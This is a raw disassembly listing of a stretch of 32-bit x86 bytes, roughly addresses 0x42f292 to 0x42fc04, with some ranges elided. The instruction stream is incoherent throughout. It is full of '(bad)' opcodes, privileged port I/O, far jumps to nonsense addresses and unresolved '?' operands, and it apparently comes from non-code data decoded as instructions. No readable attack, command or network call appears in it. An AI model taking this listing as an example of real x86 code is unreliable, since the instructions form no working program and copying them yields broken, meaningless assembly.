  42f292:	fsub   QWORD PTR [esi+eiz*1]
  42f295:	inc    ecx
  42f296:	sub    eax,0xeb7de624
  42f29b:	fild   DWORD PTR [edi]
  42f29d:	jmp    0xc6b3fb60
  42f2a2:	sub    DWORD PTR [eax+0x61],0xc6da4a84
  42f2a9:	fucomip st,st(5)
  42f2ab:	sbb    al,0xb0
  42f2ad:	pop    es
  42f2ae:	je     0x42f2f5
  42f2b0:	mov    cl,0xc2
  42f2b2:	add    DWORD PTR [edx+0x76b6eae8],0xf2de9af4
  42f2bc:	pushf  
  42f2bd:	cwde   
  42f2be:	add    eax,0xc686729f
  42f2c3:	or     bl,bl
  42f2c5:	xchg   edi,eax
  42f2c6:	lock cwde 
  42f2c8:	lahf   
  42f2c9:	mov    ebp,0x6bc2eef8
  42f2ce:	xchg   ebx,eax
  42f2cf:	xor    ch,BYTE PTR [eax+eiz*1]
  42f2d2:	push   edi
  42f2d3:	stos   BYTE PTR es:[edi],al
  42f2d4:	push   ss
  42f2d5:	pop    ebp
  42f2d6:	leave  
  42f2d7:	int3   
  42f2d8:	mov    bh,0x12
  42f2da:	or     al,0x5d
  42f2dc:	mov    al,0x7d
  42f2de:	xchg   esp,eax
  42f2df:	aaa    
  42f2e0:	addr16 icebp 
  42f2e2:	cmp    DWORD PTR [edi],eax
  42f2e4:	sar    DWORD PTR ds:0x33805cc4,0x2e
  42f2eb:	in     eax,0x8e
  42f2ed:	push   eax
  42f2ee:	cwde   
  42f2ef:	pop    ss
  42f2f0:	dec    ebp
  42f2f1:	iret   
  42f2f2:	fmul   st(3),st
  42f2f4:	xchg   esi,eax
  42f2f5:	enter  0xa9,0x86
  42f2f9:	jmp    0x42f364
  42f2fb:	pop    esp
  42f2fc:	adc    eax,0x1cf7ad81
  42f301:	dec    ebx
  42f302:	stos   BYTE PTR es:[edi],al
  42f303:	add    ebp,ecx
  42f305:	frstor [esi]
  42f307:	(bad)  
  42f308:	cmp    esp,DWORD PTR ds:0xa407360b
  42f30e:	mov    ch,BYTE PTR [edx+0x0]
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	xor    BYTE PTR [esi-0xd],dl
  42f383:	cdq    
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    BYTE PTR [ecx-0x6bd97f23],dl
  42f391:	ficom  WORD PTR [ecx-0x64cf31bc]
  42f397:	pop    ds
  42f398:	push   ebx
  42f399:	rcl    DWORD PTR ds:0xdfadc8be,cl
  42f39f:	test   al,0x96
  42f3a1:	sbb    bh,BYTE PTR [esi+0x3d1cef97]
  42f3a7:	test   al,0x3b
  42f3a9:	xor    esp,edx
  42f3ab:	sbb    BYTE PTR [edi-0x7762ef30],al
  42f3b1:	loop   0x42f36d
  42f3b3:	in     al,dx
  42f3b4:	pop    eax
  42f3b5:	popw   es
  42f3b7:	add    eax,DWORD PTR [ebx*4-0x11925ced]
  42f3be:	lods   eax,DWORD PTR ds:[esi]
  42f3bf:	call   0x1078:0xecd17309
  42f3c6:	jle    0x42f40d
  42f3c8:	dec    esp
  42f3c9:	jns    0x42f3c2
  42f3cb:	gs xchg ebx,eax
  42f3cd:	scas   eax,DWORD PTR es:[edi]
  42f3ce:	sub    ch,ch
  42f3d0:	cmp    dh,BYTE PTR [edi+0x1a08b9ac]
  42f3d6:	icebp  
  42f3d7:	out    dx,al
  42f3d8:	lods   eax,DWORD PTR ds:[esi]
  42f3d9:	lods   al,BYTE PTR ds:[esi]
  42f3da:	lods   eax,DWORD PTR ds:[esi]
  42f3db:	mov    eax,ds:0xf16544d9
  42f3e0:	mov    BYTE PTR [edi+0x6334e6b1],0x7b
  42f3e7:	mov    edx,edi
  42f3e9:	jle    0x42f444
  42f3eb:	cld    
  42f3ec:	nop
  42f3ed:	inc    edi
  42f3ee:	mov    cs,WORD PTR [ebx+0x5158dd91]
  42f3f4:	popa   
  42f3f5:	ror    DWORD PTR ds:0x7d34d75b,0xc9
  42f3fc:	sar    DWORD PTR [edx+ecx*1],cl
  42f3ff:	xchg   ebx,eax
  42f400:	mov    bh,0x2e
  42f402:	jp     0x42f42d
  42f404:	fidivr DWORD PTR [eax-0x5d]
  42f407:	icebp  
  42f408:	dec    esi
  42f409:	cld    
  42f40a:	pop    esp
  42f40b:	xchg   dh,ah
  42f40d:	out    dx,al
  42f40e:	retf   0x6c46
  42f411:	jle    0x42f394
  42f413:	cmp    dh,BYTE PTR [ebx]
  42f415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f416:	sub    ecx,ebx
  42f418:	(bad)  
  42f419:	mov    eax,0x1d83a793
  42f41e:	rcl    ebp,cl
  42f420:	retf   
  42f421:	and    bh,BYTE PTR [ebp-0x173b2c1b]
  42f427:	repz push 0x5c7ad75f
  42f42d:	je     0x42f3d0
  42f42f:	out    0x4c,eax
  42f431:	jae    0x42f3e5
  42f433:	mov    esi,0xb66a63ff
  42f438:	jge    0x42f498
  42f43a:	out    0x3f,al
  42f43c:	push   0xffffff81
  42f43e:	repz jns 0x42f46e
  42f441:	cmc    
  42f442:	mov    dh,ch
  42f444:	mov    ch,0xf3
  42f446:	jge    0x42f462
  42f448:	mov    cl,0xaa
  42f44a:	in     eax,0x72
  42f44c:	retf   
  42f44d:	cmc    
  42f44e:	popf   
  42f44f:	out    dx,eax
  42f450:	addr16 in al,dx
  42f452:	loope  0x42f49b
  42f454:	pop    ss
  42f455:	fnstsw WORD PTR [eax]
  42f457:	jmp    0x42f4a0
  42f459:	pop    ebp
  42f45a:	mov    bh,0xc1
  42f45c:	(bad)  
  42f45d:	mov    esi,0xcccda6b3
  42f462:	je     0x42f4af
  42f464:	pop    eax
  42f465:	out    0x35,al
  42f467:	shl    BYTE PTR [ebx+esi*2+0x7766b39d],1
  42f46e:	xchg   ebp,eax
  42f46f:	aaa    
  42f470:	and    al,0xf8
  42f472:	lods   al,BYTE PTR ds:[esi]
  42f473:	xor    al,dh
  42f475:	(bad)  
  42f476:	xchg   ebp,eax
  42f477:	pop    esi
  42f478:	pop    ss
  42f479:	pushf  
  42f47a:	mov    dh,0x39
  42f47c:	mov    eax,0xa55e0433
  42f481:	xchg   ebx,eax
  42f482:	inc    ebx
  42f483:	(bad)  
  42f484:	push   ebp
  42f485:	retf   
  42f486:	inc    BYTE PTR [ecx+0x10]
  42f489:	hlt    
  42f48a:	and    al,0x58
  42f48c:	ja     0x42f42a
  42f48e:	cs dec ecx
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	add    BYTE PTR [edx-0x4],al
  42f503:	sub    DWORD PTR [edx+edi*8+0x1],0x0
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	lea    esp,[edi+0x1b]
  42f50f:	pop    edi
  42f510:	addr16 fs (bad) 
  42f513:	out    dx,eax
  42f514:	add    ebx,esi
  42f516:	mov    esi,0x99f9ac6
  42f51b:	lds    ebx,FWORD PTR [ebp+0xc]
  42f51e:	in     al,dx
  42f51f:	mov    dl,0x33
  42f521:	out    dx,eax
  42f522:	mov    ah,0x58
  42f524:	cwde   
  42f525:	cmp    eax,0x5fcaecc9
  42f52b:	dec    edi
  42f52c:	mov    bh,0xe0
  42f52e:	scas   al,BYTE PTR es:[edi]
  42f52f:	pop    edx
  42f530:	pop    es
  42f531:	outs   dx,BYTE PTR ds:[esi]
  42f532:	call   0x47bf157c
  42f537:	jge    0x42f4d2
  42f539:	sub    esp,edx
  42f53b:	in     eax,dx
  42f53c:	fsubr  QWORD PTR [edi+0x19585624]
  42f542:	outs   dx,BYTE PTR ds:[esi]
  42f543:	adc    al,0x4f
  42f545:	or     DWORD PTR [ebp-0x9bc5ea4],0x29b5d7ea
  42f54f:	jl     0x42f50b
  42f551:	rcl    BYTE PTR [edi-0x59],cl
  42f554:	retf   
  42f555:	rol    BYTE PTR ds:0x8bd674c1,0x72
  42f55c:	dec    edi
  42f55d:	outs   dx,BYTE PTR ds:[esi]
  42f55e:	sbb    al,0x2c
  42f560:	and    BYTE PTR [esi-0x44],ch
  42f563:	fs jo  0x42f52a
  42f566:	pop    ss
  42f567:	leave  
  42f568:	leave  
  42f569:	int    0x99
  42f56b:	add    dh,BYTE PTR [edx+edx*1-0x31]
  42f56f:	cs ret 
  42f571:	mov    eax,0xfbe80b31
  42f576:	or     dh,ch
  42f578:	scas   eax,DWORD PTR es:[edi]
  42f579:	shl    edx,1
  42f57b:	xchg   edi,eax
  42f57c:	(bad)  
  42f57d:	out    0xa5,eax
  42f57f:	adc    eax,0x38a697e5
  42f584:	call   0x94b65d67
  42f589:	cmc    
  42f58a:	add    ch,al
  42f58c:	jb     0x42f53f
  42f58e:	stc    
  42f58f:	mov    ecx,0x6eb2d170
  42f594:	aaa    
  42f595:	cmp    cl,BYTE PTR [edx+edx*4]
  42f598:	loopne 0x42f5fd
  42f59a:	and    esi,DWORD PTR ds:0x2ea9acf1
  42f5a0:	cmp    esi,ebp
  42f5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5a3:	sbb    BYTE PTR [ecx+0x152d0330],0x2f
  42f5aa:	mov    dl,0x1e
  42f5ad:	hlt    
  42f5ae:	aaa    
  42f5af:	icebp  
  42f5b0:	test   al,0xf3
  42f5b2:	out    dx,eax
  42f5b3:	mov    dh,0xfa
  42f5b5:	dec    ebp
  42f5b6:	mov    ah,0x87
  42f5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5b9:	(bad)  
  42f5ba:	imul   ebx,DWORD PTR [edi],0xffffff92
  42f5bd:	pop    eax
  42f5be:	jecxz  0x42f602
  42f5c0:	add    dh,cl
  42f5c2:	inc    esp
  42f5c3:	jns    0x42f556
  42f5c5:	call   0x53d67f3e
  42f5ca:	and    ecx,ecx
  42f5cc:	mov    edi,0x536d1e46
  42f5d1:	adc    DWORD PTR [ebx+0x60],ebx
  42f5d4:	or     esi,esi
  42f5d6:	xor    BYTE PTR [ebx+0x76],dl
  42f5d9:	popa   
  42f5da:	pusha  
  42f5db:	nop
  42f5dc:	mov    WORD PTR [edx],es
  42f5de:	inc    esp
  42f5df:	or     ebx,DWORD PTR [ecx-0xf]
  42f5e2:	inc    eax
  42f5e3:	pushf  
  42f5e4:	and    eax,0xb547a4e4
  42f5e9:	loope  0x42f645
  42f5eb:	ins    DWORD PTR es:[edi],dx
  42f5ec:	mov    ecx,0x7188b453
  42f5f1:	xchg   DWORD PTR [esi-0xc5ea86d],eax
  42f5f7:	or     DWORD PTR [ebx-0x75],ebp
  42f5fa:	fcmovb st,st(2)
  42f5fc:	mov    BYTE PTR [ebx+0x23b4a329],bl
  42f602:	hlt    
  42f603:	sbb    DWORD PTR [esi-0x2b],esi
  42f606:	mov    ds:0x76cf1094,eax
  42f60b:	sahf   
  42f60c:	mov    es,WORD PTR [ecx+0x53d3]
	...
  42f672:	add    BYTE PTR [eax],al
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	rol    DWORD PTR [esi],0x41
  42f683:	fs jo  0x42f681
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	icebp  
  42f68d:	jno    0x42f690
  42f68f:	(bad)  
  42f690:	sbb    DWORD PTR [ebp+0x3b0204a7],edi
  42f696:	lock loope 0x42f6f3
  42f699:	in     eax,dx
  42f69a:	jp     0x42f6b2
  42f69c:	into   
  42f69d:	xor    al,BYTE PTR [ebx]
  42f69f:	xor    al,BYTE PTR [esi-0x41]
  42f6a2:	mov    ds:0xab434de8,al
  42f6a7:	outs   dx,BYTE PTR ds:[esi]
  42f6a8:	icebp  
  42f6a9:	and    ah,cl
  42f6ab:	mov    dl,0x46
  42f6ad:	push   0xfcda9a26
  42f6b2:	push   eax
  42f6b3:	scas   eax,DWORD PTR es:[edi]
  42f6b4:	mov    al,0x43
  42f6b6:	inc    edi
  42f6b7:	inc    ebp
  42f6b8:	add    esi,esp
  42f6ba:	fdiv   QWORD PTR [ebx+0x430567da]
  42f6c0:	neg    BYTE PTR [esp+ecx*2-0x4996b858]
  42f6c7:	sbb    dh,BYTE PTR [ecx+0x13]
  42f6ca:	pop    edx
  42f6cb:	push   eax
  42f6cc:	pop    eax
  42f6cd:	dec    eax
  42f6ce:	cmp    DWORD PTR [eax-0xc],0x2a
  42f6d2:	in     eax,dx
  42f6d3:	and    ch,BYTE PTR [ecx+edx*4+0x1e]
  42f6d7:	out    dx,eax
  42f6d8:	sub    ch,BYTE PTR [edi]
  42f6da:	cli    
  42f6db:	and    eax,0xf797ed7d
  42f6e0:	ss pop eax
  42f6e2:	sub    BYTE PTR [edx+edi*1-0x31],dl
  42f6e6:	arpl   si,bx
  42f6e8:	push   edi
  42f6e9:	pusha  
  42f6ea:	jle    0x42f6c5
  42f6ec:	das    
  42f6ed:	xor    dh,dl
  42f6ef:	jecxz  0x42f688
  42f6f1:	dec    ebx
  42f6f2:	jg     0x42f703
  42f6f4:	outs   dx,DWORD PTR ds:[esi]
  42f6f5:	sub    eax,0x9a3fb775
  42f6fa:	sub    dh,BYTE PTR [esp+ecx*2-0x38]
  42f6fe:	addr16 retf 
  42f700:	dec    eax
  42f701:	mov    WORD PTR [esi-0x2],cs
  42f704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f705:	lahf   
  42f706:	xchg   ebx,eax
  42f707:	jp     0x42f70a
  42f709:	sub    dh,dh
  42f70b:	out    0x28,eax
  42f70d:	not    BYTE PTR [esi+0x2]
  42f710:	stc    
  42f711:	push   ebx
  42f712:	add    ebx,esp
  42f714:	(bad)  
  42f715:	fstp   DWORD PTR [edi+0x3d]
  42f718:	sub    DWORD PTR [esi-0x4d],0xffffffba
  42f71c:	out    0x47,al
  42f71e:	xchg   edx,eax
  42f71f:	test   BYTE PTR [eax],ah
  42f721:	repnz fist DWORD PTR [ebx]
  42f724:	xor    eax,0x91620d50
  42f729:	push   ss
  42f72a:	(bad)  [edi+0x25a43d8b]
  42f730:	mov    ah,0x1f
  42f732:	in     al,dx
  42f733:	stc    
  42f734:	scas   eax,DWORD PTR es:[edi]
  42f735:	xor    BYTE PTR [esi-0x62a94e94],bl
  42f73b:	ret    
  42f73c:	or     al,0xc4
  42f73e:	daa    
  42f73f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f740:	add    eax,edx
  42f742:	cli    
  42f743:	jp     0x42f707
  42f745:	sbb    DWORD PTR [edi-0x8],edi
  42f748:	rol    BYTE PTR [ecx],1
  42f74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f74b:	daa    
  42f74c:	xor    eax,0x85b124f0
  42f751:	push   ds
  42f752:	bound  eax,QWORD PTR [edi-0x145be233]
  42f758:	and    BYTE PTR [esi],0x11
  42f75b:	std    
  42f75c:	jle    0x42f717
  42f75e:	xchg   edi,eax
  42f75f:	xor    BYTE PTR [ebx-0x6b],bl
  42f762:	cs mov ebp,0x9ef0551d
  42f768:	mov    ecx,0xee35fa1d
  42f76d:	mov    ?,WORD PTR [esp+ebx*8-0x1135ba3c]
  42f774:	out    dx,eax
  42f775:	mov    edx,0x46a372bc
  42f77a:	mov    edx,0xb20e209e
  42f77f:	cmovnp esi,DWORD PTR [ebx]
  42f782:	aas    
  42f783:	out    0xcc,eax
  42f785:	and    al,0x77
  42f787:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42f789:	pop    ss
  42f78a:	mov    ds:0xf97542c,al
  42f78f:	inc    ebp
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x83ea9d68
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	mov    ebx,0x4f05562e
  42f811:	mov    gs,WORD PTR [edx]
  42f813:	xchg   edx,eax
  42f814:	scas   al,BYTE PTR es:[edi]
  42f815:	call   0x6e38:0xa55e46a
  42f81c:	dec    ebx
  42f81e:	outs   dx,DWORD PTR ds:[esi]
  42f81f:	inc    edi
  42f820:	xchg   esi,eax
  42f821:	ins    BYTE PTR es:[edi],dx
  42f822:	lahf   
  42f823:	or     BYTE PTR [eax],0x61
  42f826:	sbb    eax,esi
  42f828:	adc    DWORD PTR [ebx-0x6a1b1865],ebx
  42f82e:	or     eax,0xe7edeaf
  42f833:	je     0x42f805
  42f835:	div    esi
  42f837:	(bad)  
  42f838:	nop
  42f839:	xor    BYTE PTR [ebx],0x4f
  42f83c:	retf   
  42f83d:	add    DWORD PTR [ebx],edx
  42f83f:	inc    ebx
  42f840:	(bad)  
  42f841:	jbe    0x42f8b4
  42f843:	mov    bl,0x28
  42f845:	and    al,0x89
  42f847:	or     eax,DWORD PTR [ebp+0x512b8f3a]
  42f84d:	jp     0x42f83f
  42f84f:	scas   al,BYTE PTR es:[edi]
  42f850:	push   eax
  42f851:	mov    bh,0xef
  42f853:	push   es
  42f854:	fld    DWORD PTR [esi-0x71e95552]
  42f85a:	push   es
  42f85b:	sub    dl,ch
  42f85d:	xchg   cx,ax
  42f85f:	or     al,dh
  42f861:	jmp    0x42f836
  42f863:	pop    esp
  42f864:	arpl   WORD PTR [edi-0x6d0fa41a],bx
  42f86a:	test   BYTE PTR [edx+ecx*1],dh
  42f86d:	push   es
  42f86e:	scas   eax,DWORD PTR es:[edi]
  42f86f:	sub    eax,DWORD PTR es:[eax+0x78]
  42f873:	stos   DWORD PTR es:[edi],eax
  42f874:	lods   eax,DWORD PTR ds:[esi]
  42f875:	mov    eax,0xfa13090b
  42f87a:	jp     0x42f894
  42f87c:	aam    0x64
  42f87e:	cli    
  42f87f:	test   DWORD PTR [ecx+ebx*2+0x2],edx
  42f883:	and    eax,edx
  42f885:	in     eax,0x71
  42f887:	push   ss
  42f888:	in     eax,dx
  42f889:	inc    esi
  42f88a:	mov    ebp,0xfeb24ee6
  42f88f:	rcr    DWORD PTR [esi-0x65],1
  42f892:	mov    al,BYTE PTR [esi+0xd38573a]
  42f898:	adc    eax,0x2a4483a0
  42f89d:	int3   
  42f89e:	in     eax,dx
  42f89f:	rcl    BYTE PTR [ebx+0x4],1
  42f8a2:	pusha  
  42f8a3:	jmp    0xaf11:0x9a475303
  42f8aa:	push   edi
  42f8ab:	xor    esp,DWORD PTR [esi+0x76f780d1]
  42f8b1:	sbb    eax,0xaedbd3e2
  42f8b6:	iret   
  42f8b7:	sbb    bl,bl
  42f8b9:	adc    BYTE PTR [edi],cl
  42f8bb:	jg     0x42f88d
  42f8bd:	dec    esp
  42f8be:	xor    al,0xd8
  42f8c0:	inc    BYTE PTR [edi]
  42f8c2:	test   al,0xc1
  42f8c4:	ss ret 
  42f8c6:	pxor   mm7,QWORD PTR [eax+0x5191f186]
  42f8cd:	dec    ebp
  42f8ce:	fidivr WORD PTR [esi+0x55]
  42f8d1:	dec    edi
  42f8d2:	mov    BYTE PTR [eax-0x2f],dh
  42f8d5:	push   0xb8b4134c
  42f8da:	sbb    BYTE PTR [edi],dl
  42f8dc:	ins    BYTE PTR es:[edi],dx
  42f8dd:	sub    DWORD PTR [ecx+0x70],ebp
  42f8e0:	mov    edx,0x780b8887
  42f8e5:	add    al,0xa8
  42f8e7:	xor    al,0x4a
  42f8e9:	xchg   BYTE PTR [ecx+0x46],ah
  42f8ec:	pop    ecx
  42f8ed:	das    
  42f8ee:	sahf   
  42f8ef:	in     al,dx
  42f8f0:	dec    eax
  42f8f1:	push   0x2f
  42f8f3:	imul   eax,DWORD PTR [esi],0xfffffff7
  42f8f6:	xor    DWORD PTR [edi-0x37d8842a],eax
  42f8fc:	icebp  
  42f8fd:	pusha  
  42f8fe:	adc    DWORD PTR [ecx],esi
  42f900:	add    eax,0x2f93d5e2
  42f905:	iret   
  42f906:	dec    ebp
  42f907:	les    esp,FWORD PTR [edi]
  42f909:	jbe    0x42f960
  42f90b:	push   esp
  42f90c:	aaa    
  42f90d:	jne    0x42f8d5
  42f90f:	jl     0x42f911
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9be
  42f981:	popf   
  42f982:	ss pushf 
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	sti    
  42f98d:	data16 scas al,BYTE PTR es:[edi]
  42f98f:	mov    edi,0x65256c30
  42f994:	ins    DWORD PTR es:[edi],dx
  42f995:	push   0xffffffc4
  42f997:	mov    esi,0x37217e1f
  42f99c:	push   ebx
  42f99d:	in     al,0xe7
  42f99f:	mov    esi,0xff4a915b
  42f9a4:	mov    bl,0xfc
  42f9a6:	adc    esi,DWORD PTR [edi+0x6d]
  42f9a9:	(bad)  
  42f9aa:	mov    edx,0xdd482eae
  42f9af:	mov    es,WORD PTR [eax-0x1b]
  42f9b2:	sbb    DWORD PTR [ecx+0x34],ebp
  42f9b5:	iret   
  42f9b6:	hlt    
  42f9b7:	push   edx
  42f9b8:	mov    ds:0xd616af25,eax
  42f9bd:	aam    0xdb
  42f9bf:	outs   dx,BYTE PTR ds:[esi]
  42f9c0:	lds    ebp,FWORD PTR [edx+0x50a29e44]
  42f9c6:	jmp    FWORD PTR [eax]
  42f9c8:	sbb    eax,DWORD PTR [ebx+esi*2]
  42f9cb:	mov    WORD PTR [edx-0x22],?
  42f9ce:	mov    esi,DWORD PTR [edx]
  42f9d0:	mov    al,ds:0xfa98b29b
  42f9d5:	int3   
  42f9d6:	sub    esp,DWORD PTR [ebx]
  42f9d8:	inc    esi
  42f9d9:	inc    edx
  42f9da:	not    edi
  42f9dc:	dec    ebp
  42f9dd:	jecxz  0x42fa3e
  42f9df:	push   cs
  42f9e0:	jg     0x42f9cd
  42f9e2:	sub    BYTE PTR [ebp+0xb],ah
  42f9e5:	and    DWORD PTR [ecx],0xe3908ee9
  42f9eb:	imul   esp,ebp,0xb06c70fa
  42f9f1:	sar    edi,cl
  42f9f3:	mov    bl,0x78
  42f9f5:	fidiv  WORD PTR [ebx-0x66]
  42f9f8:	ja     0x42f9fc
  42f9fa:	sub    ebp,DWORD PTR [edi+0x12]
  42f9fd:	mov    esi,0xe4f2168e
  42fa02:	clc    
  42fa03:	repz repnz stc 
  42fa06:	or     DWORD PTR [ebx],esi
  42fa08:	fadd   QWORD PTR [ebx]
  42fa0a:	add    eax,0x5daceab9
  42fa0f:	mov    eax,ds:0x94353439
  42fa14:	sbb    DWORD PTR [edx-0x67800a00],edi
  42fa1a:	stos   BYTE PTR es:[edi],al
  42fa1b:	retf   
  42fa1c:	das    
  42fa1d:	xchg   esi,eax
  42fa1e:	mov    cl,0x10
  42fa20:	sbb    DWORD PTR [eax-0x3],esp
  42fa23:	das    
  42fa24:	loope  0x42fa12
  42fa26:	add    DWORD PTR [esi+0x7b],0xffffffd5
  42fa2a:	shl    cl,0x9b
  42fa2d:	pop    esp
  42fa2e:	ins    DWORD PTR es:[edi],dx
  42fa2f:	adc    DWORD PTR [edx+0x19716bb7],eax
  42fa35:	add    eax,0xbcdc4b08
  42fa3a:	lea    esi,[eax-0x80]
  42fa3d:	dec    eax
  42fa3e:	dec    ebp
  42fa3f:	gs add ebx,eax
  42fa42:	ds dec ebx
  42fa44:	pop    edi
  42fa45:	jmp    0x42f9e8
  42fa47:	jnp    0x42fa35
  42fa49:	test   BYTE PTR [edi-0x2e],dh
  42fa4c:	mov    cl,0xa5
  42fa4e:	ret    0x5722
  42fa51:	cmp    DWORD PTR [edx+0x37],ecx
  42fa54:	cs stos DWORD PTR es:[edi],eax
  42fa56:	push   es
  42fa57:	pop    es
  42fa58:	sti    
  42fa59:	addr16 or eax,0x480e8a93
  42fa5f:	push   ebp
  42fa60:	inc    eax
  42fa61:	ret    0xa87
  42fa64:	and    BYTE PTR [ebp+0x239a73e9],0xfc
  42fa6b:	imul   ebx,DWORD PTR [bp+di+0x6],0x8da52bcb
  42fa73:	mov    ds:0xf0d33915,eax
  42fa78:	mov    ah,0xca
  42fa7a:	sub    dh,ah
  42fa7c:	popf   
  42fa7d:	js     0x42fac4
  42fa7f:	jmp    0x9b19:0x134ad269
  42fa86:	mov    dl,0x38
  42fa88:	cmp    DWORD PTR [esi-0x87355cd],ebx
  42fa8e:	sbb    eax,ebp
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	test   al,0xae
  42fb02:	inc    eax
  42fb03:	push   ecx
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	push   ecx
  42fb0d:	int3   
  42fb0e:	ins    BYTE PTR es:[edi],dx
  42fb0f:	dec    eax
  42fb10:	cmp    ch,dh
  42fb12:	aaa    
  42fb13:	mov    ebp,ebx
  42fb15:	inc    ecx
  42fb16:	cmp    eax,0xbc57ab84
  42fb1b:	fcomp  DWORD PTR [ecx+esi*8-0x27]
  42fb1f:	js     0x42fb6f
  42fb21:	popf   
  42fb22:	cmp    al,0x48
  42fb24:	sbb    al,0x9
  42fb26:	jge    0x42fb79
  42fb28:	pop    edi
  42fb29:	or     eax,0xc0908e4b
  42fb2e:	lea    edx,[edx]
  42fb30:	rcl    BYTE PTR [eax-0x6b],0x84
  42fb34:	scas   eax,DWORD PTR es:[edi]
  42fb35:	cs jae 0x42fba1
  42fb38:	sub    DWORD PTR [edi+0x49],ebx
  42fb3b:	jmp    0x7444:0x42da4b20
  42fb42:	mov    eax,ds:0x6aff3560
  42fb47:	mov    ?,WORD PTR [edi]
  42fb49:	aam    0xfc
  42fb4b:	in     eax,0x41
  42fb4d:	fdivr  QWORD PTR [esi-0x40a65a65]
  42fb53:	imul   esi,DWORD PTR [esp+ebx*4-0x6e],0xffffff8c
  42fb58:	xchg   edi,eax
  42fb59:	lock or esp,DWORD PTR [ebx-0x3eeb11de]
  42fb60:	xor    al,0x25
  42fb62:	push   ebp
  42fb63:	sbb    ebx,DWORD PTR [ebx]
  42fb65:	mov    ch,0x7d
  42fb67:	fucomip st,st(4)
  42fb69:	dec    edx
  42fb6a:	inc    eax
  42fb6b:	jp     0x42fb40
  42fb6d:	ds (bad) 
  42fb6f:	std    
  42fb70:	clc    
  42fb71:	pop    edi
  42fb72:	cmp    BYTE PTR [esi-0x52ce90e4],dl
  42fb78:	dec    esp
  42fb79:	sbb    BYTE PTR [ebp-0x6c],0x3c
  42fb7d:	lock fwait
  42fb7f:	lds    ecx,FWORD PTR [ecx-0x412f726a]
  42fb85:	xchg   BYTE PTR [esp+edx*1+0x42],al
  42fb89:	push   ebx
  42fb8a:	xor    BYTE PTR [edi],dl
  42fb8c:	js     0x42fbba
  42fb8e:	dec    esi
  42fb8f:	sub    BYTE PTR [esi-0x44df7967],0xbb
  42fb96:	fld    TBYTE PTR [ebx-0x73]
  42fb99:	add    dl,ah
  42fb9b:	es int 0xc7
  42fb9e:	xchg   ch,cl
  42fba0:	mov    ds:0x55700c2f,eax
  42fba5:	jg     0x42fbd0
  42fba7:	adc    eax,0xb502df80
  42fbac:	cs cld 
  42fbae:	mov    esp,0x8387224
  42fbb3:	jno    0x42fbcc
  42fbb5:	scas   al,BYTE PTR es:[edi]
  42fbb6:	or     ah,BYTE PTR [ebx]
  42fbb8:	leave  
  42fbb9:	push   edx
  42fbba:	adc    ecx,DWORD PTR [ebp+0x4e]
  42fbbd:	(bad)  
  42fbbe:	aas    
  42fbbf:	xor    dl,0x34
  42fbc2:	inc    ecx
  42fbc3:	mov    edx,0x9d56d7e0
  42fbc8:	mov    ch,0xba
  42fbca:	inc    ebp
  42fbcb:	jg     0x42fc00
  42fbcd:	outs   dx,DWORD PTR ds:[esi]
  42fbce:	and    eax,DWORD PTR [edi-0x31326346]
  42fbd4:	dec    ecx
  42fbd5:	add    eax,0xbcd1f2d3
  42fbda:	stos   BYTE PTR es:[edi],al
  42fbdb:	out    dx,eax
  42fbdc:	mov    ds:0x427efbbf,eax
  42fbe1:	dec    edi
  42fbe2:	in     eax,0xad
  42fbe4:	push   eax
  42fbe5:	mov    bh,0xfe
  42fbe7:	fmul   DWORD PTR [ebx+0x780a6329]
  42fbed:	lods   eax,DWORD PTR ds:[esi]
  42fbee:	dec    ecx
  42fbef:	xchg   esp,eax
  42fbf0:	mov    ebp,0xd91cf0b7
  42fbf5:	addr16 push eax
  42fbf7:	xchg   esi,eax
  42fbf8:	addr16 mov eax,ds:0x327a
  42fbfc:	outs   dx,BYTE PTR ds:[esi]
  42fbfd:	xor    cl,BYTE PTR [ecx]
  42fbff:	dec    edx
  42fc00:	repnz pop ds
  42fc02:	push   0xa
  42fc04:	mov    cl,BYTE PTR [ebp-0x4a10bf85]
